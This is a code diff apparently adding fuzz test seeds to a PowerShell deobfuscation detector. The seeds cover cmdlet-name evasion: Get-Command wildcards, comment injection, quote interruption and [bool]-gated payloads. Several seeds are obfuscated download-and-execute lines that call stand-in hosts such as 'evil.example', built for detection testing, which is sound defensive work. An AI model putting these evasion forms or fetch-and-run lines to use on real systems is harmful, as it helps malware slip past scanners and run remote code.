@@ -68,6 +68,17 @@ const POWERSHELL_TECHNIQUE_CATALOG = Object.freeze([
   'PowerShell SecureString Decode',
   'PowerShell AMSI/ETW Reflective Patch',
   'PowerShell [scriptblock]::Create (reflection)',
+  // ── Phase 5 additions: literal-free identifier reconstruction ───────
+  // Techniques that dodge signature matching without any base64 /
+  // char-array primitive — the attacker writes the cmdlet name itself
+  // in a way that is not grep-able. Each has a dedicated branch /
+  // rule; the ps-mini evaluator's interpreter gains matching support
+  // for `[bool]` casts so conditional-gated payloads deobfuscate
+  // (surfaces as `PowerShell Variable Resolution` — there is no
+  // separate technique label for the interpreter extension).
+  'PowerShell Get-Command Wildcard',
+  'PowerShell Comment Injection',
+  'PowerShell Quote Interruption (single-token)',
 ]);
 
 function makeRng(seed) {
@@ -597,6 +608,122 @@ function genReflectiveScriptBlock() {
   return out;
 }
 
+// ── Phase 5 additions: literal-free identifier reconstruction ───────────
+
+function genGetCommandWildcard() {
+  // `&(Get-Command <glob>)` / `&(gcm <glob>)` — resolves a sensitive
+  // cmdlet by glob without ever writing its literal name. The decoder
+  // matches the glob against `KNOWN_PS_CMDLETS_SENSITIVE` and emits
+  // the canonical cmdlet(s) in `deobfuscated`.
+  const out = [];
+  // Unambiguous single-match globs. `i*x` resolves to both `iex` AND
+  // `invoke-expression` (both carry severity "critical" so the resolver
+  // emits both joined with `|`). Expected substring is the common
+  // prefix "iex".
+  out.push(makeSeed(
+    "&(gcm i*x) 'whoami'",
+    'iex',
+  ));
+  out.push(makeSeed(
+    "&(Get-Command i????e-rest*) -uri 'http://evil.example/p'",
+    'invoke-restmethod',
+  ));
+  out.push(makeSeed(
+    "&(gcm s*-p*) powershell -c 'iex'",
+    'start-process',
+  ));
+  out.push(makeSeed(
+    ".(Get-Command n?w-o*) Net.WebClient",
+    'new-object',
+  ));
+  // Variable-then-call form — the resolver fires on the `&(gcm …)`
+  // branch itself, not on the variable flow; assigning to `$c` is
+  // noise that should not change detection.
+  out.push(makeSeed(
+    "$c = &(gcm i*x); & $c 'whoami'",
+    'iex',
+  ));
+  return out;
+}
+
+function genPsCommentInjection() {
+  // `I<##>nvoke<##>-Expression` — PowerShell block comments inserted
+  // between letters of a sensitive cmdlet name. Post-strip the
+  // identifier matches SENSITIVE_CMD_KEYWORDS. Comment bodies span
+  // 0-16 chars of noise so the pre-pass's length bound gets exercised.
+  const out = [];
+  const patterns = [
+    ['Inv<##>oke<##>-Expression',                 'Invoke-Expression'],
+    ['Invoke<#xx#>-<#yy#>WebRequest',             'Invoke-WebRequest'],
+    ['New<# pad #>-Object',                       'New-Object'],
+    ['power<# anything 1 #>shell',                'powershell'],
+    ['Start<##>-<#.#>Process',                    'Start-Process'],
+    ['iex<# padding #>',                          'iex'],
+  ];
+  for (const [inj, kw] of patterns) {
+    // Wrap in an exec-context shape so post-strip the line resembles
+    // a real invocation.
+    out.push(makeSeed(`& ${inj} 'arg'`, kw));
+    out.push(makeSeed(`${inj} -NoProfile`, kw));
+  }
+  return out;
+}
+
+function genBoolTypecast() {
+  // `[bool]1254`, `![bool]$null`, `[bool]"x"` — ps-mini evaluator now
+  // collapses these into the boolean they produce, unlocking conditional
+  // branches that guard a payload. Seeds exercise the interpreter's
+  // `[bool]` handling via a guarded `iex`: if the guard evaluates to
+  // true the inner payload should be extractable. The per-shell fuzz
+  // target verifies the resolver emits a PS Variable Resolution
+  // candidate whose `deobfuscated` text includes the inner payload
+  // string, which requires the bool gate to evaluate truthy.
+  const out = [];
+  out.push(makeSeed(
+    "$g = [bool]1254\nif ($g) { $c = 'Invoke-Expression'; & $c 'whoami' }",
+    'Invoke-Expression',
+  ));
+  out.push(makeSeed(
+    "$g = ![bool]$null\nif ($g) { $c = 'Invoke-Expression'; & $c }",
+    'Invoke-Expression',
+  ));
+  out.push(makeSeed(
+    "$g = [bool]'nonempty'\nif ($g) { $c = 'IEX'; & $c '(iwr http://e/p).Content' }",
+    'IEX',
+  ));
+  out.push(makeSeed(
+    "$g = (9999 -eq 9999)\nif ($g) { $c = 'Invoke-Expression'; & $c }",
+    'Invoke-Expression',
+  ));
+  // Double negation: !!<anything> is true.
+  out.push(makeSeed(
+    "$g = !!!![bool][bool]\nif ($g) { $c = 'Invoke-Expression'; & $c }",
+    'Invoke-Expression',
+  ));
+  return out;
+}
+
+function genPsQuoteInterruption() {
+  // `i''e''x` — empty-string pairs wedged between identifier letters.
+  // PowerShell's parser reads the pairs as adjacent empty strings but
+  // our decoder strips them when the stripped identifier matches
+  // SENSITIVE_CMD_KEYWORDS. Test both `''` and `""` forms.
+  const out = [];
+  const variants = [
+    ["i''e''x",               'iex'],
+    ['i""e""x',               'iex'],
+    ["I''nv''o''ke-Expression", 'Invoke-Expression'],
+    ['p""o""w""e""r""s""h""e""l""l', 'powershell'],
+    ["c''er''t''ut''il",      'certutil'],
+    ["r''u''n''d''l''l''3''2", 'rundll32'],
+  ];
+  for (const [tok, kw] of variants) {
+    out.push(makeSeed(`${tok} 'arg'`, kw));
+    out.push(makeSeed(`& ${tok}`, kw));
+  }
+  return out;
+}
+
 function generatePowerShellSeeds() {
   const rng = makeRng(0x50E1100A);
   return [
@@ -620,6 +747,11 @@ function generatePowerShellSeeds() {
     ...genSecureStringInlineKey(),
     ...genAmsiEtwReflective(),
     ...genReflectiveScriptBlock(),
+    // Phase 5 additions — literal-free identifier reconstruction
+    ...genGetCommandWildcard(),
+    ...genPsCommentInjection(),
+    ...genBoolTypecast(),
+    ...genPsQuoteInterruption(),
   ];
 }
 
